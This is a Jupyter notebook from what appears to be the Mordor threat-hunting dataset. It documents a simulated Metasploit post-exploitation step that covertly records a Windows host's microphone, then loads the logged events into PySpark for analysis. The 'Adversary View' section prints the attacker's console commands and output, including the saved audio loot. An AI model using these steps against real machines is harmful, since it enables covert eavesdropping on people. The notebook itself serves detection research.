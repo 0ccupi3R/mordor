{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# MSF Record Microphone"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SDWIN-200609225055 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2020/06/09 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| Mordor shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Metasploit |\n",
    "| Simulation Script | https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/collection/msf_record_mic.zip |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries accessing the microphone of an endpoint."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\n",
    "msf5 post(multi/manage/record_mic) > set SESSION 2\n",
    "SESSION => 2\n",
    "msf5 post(multi/manage/record_mic) > info\n",
    "\n",
    "      Name: Multi Manage Record Microphone\n",
    "    Module: post/multi/manage/record_mic\n",
    "  Platform: Linux, OSX, Windows\n",
    "      Arch: \n",
    "      Rank: Normal\n",
    "\n",
    "Provided by:\n",
    "  sinn3r <sinn3r@metasploit.com>\n",
    "\n",
    "Compatible session types:\n",
    "  Meterpreter\n",
    "\n",
    "Basic options:\n",
    "  Name      Current Setting  Required  Description\n",
    "  ----      ---------------  --------  -----------\n",
    "  DURATION  5                no        Number of seconds to record\n",
    "  SESSION   2                yes       The session to run this module on.\n",
    "\n",
    "Description:\n",
    "  This module will enable and record your target's microphone. For \n",
    "  non-Windows targets, please use Java meterpreter to be able to use \n",
    "  this feature.\n",
    "\n",
    "msf5 post(multi/manage/record_mic) > run\n",
    "\n",
    "[*] 172.18.39.6 - 20%...\n",
    "[*] 172.18.39.6 - 40%...\n",
    "[*] 172.18.39.6 - 60%...\n",
    "[*] 172.18.39.6 - 80%...\n",
    "[*] 172.18.39.6 - 100%...\n",
    "[*] 172.18.39.6 - Audio size: (55169 bytes)\n",
    "[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n",
    "[*] Post module execution completed\n",
    "msf5 post(multi/manage/record_mic) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/collection/msf_record_mic.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT *\n",
    "FROM mordorTable\n",
    "    '''\n",
    ")\n",
    "df.printSchema()\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
